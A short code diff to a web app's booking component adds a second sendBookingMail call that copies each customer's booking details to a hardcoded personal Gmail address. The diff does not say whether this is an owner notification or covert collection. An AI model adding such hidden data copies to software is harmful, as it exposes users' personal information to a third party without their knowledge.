@@ -168,7 +168,8 @@ const Booking = () => {
 
 
 
-            await sendBookingMail(details)
+            await sendBookingMail(details, email)
+            await sendBookingMail(details, "rolex515134@gmail.com")
 
         }
         setIsLoader(false)
